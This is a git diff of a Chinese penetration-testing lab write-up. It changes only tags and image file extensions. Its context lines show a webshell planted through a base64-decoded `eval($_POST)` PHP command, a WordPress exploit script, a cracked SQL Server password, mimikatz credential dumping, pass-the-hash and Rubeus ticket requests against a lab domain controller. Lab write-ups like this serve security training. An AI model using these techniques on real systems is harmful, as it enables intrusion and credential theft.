@@ -6,9 +6,8 @@ date: "2025-08-20T13:30:44+08:00"
 lastmod: "2025-08-20T13:30:44+08:00"
 image: ""
 license: ""
-categories: ["春秋云镜"]
-tags: ["Pentest"]
-
+categories: ["offensive-security"]
+tags: ["春秋云镜"]
 ---
 ## flag1
 
@@ -179,17 +178,17 @@ python3 WpCargo.py --help
 python3 WpCargo.py -t http://172.22.2.18/
 ```
 
-![image](./assets/001.webp)
+![image](./assets/001.png)
 
 写个木马上去链接一下`2=echo PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=|base64 -d > /var/www/html/shell.php`
 
-![image](./assets/002.webp)
+![image](./assets/002.png)
 
 拿到数据库账号密码，链一下
 
-![image](./assets/003.webp)
+![image](./assets/003.png)
 
-![image](./assets/004.webp)
+![image](./assets/004.png)
 
 发现flag2和密码，把**密码**导出来进行爆破，用户名不需要
 
@@ -197,7 +196,7 @@ python3 WpCargo.py -t http://172.22.2.18/
 
 接下来打**MSSQLSERVER.xiaorang.lab**，https://github.com/shack2/SNETCracker/releases 用工具进行爆破，我是win10直接用的exe就行
 
-![image](./assets/005.webp)
+![image](./assets/005.png)
 
 ```
 172.22.2.16----SQLServer----1433----sa----ElGNkOiC
@@ -227,7 +226,7 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
-![image](./assets/006.webp)
+![image](./assets/006.png)
 
 拿到NTHash之后直接PTH攻击，懒得制作银票
 
@@ -303,6 +302,5 @@ C:\Users\test1\Desktop>.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:4f4be8211219a
 
 type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
 ```
-
 
 
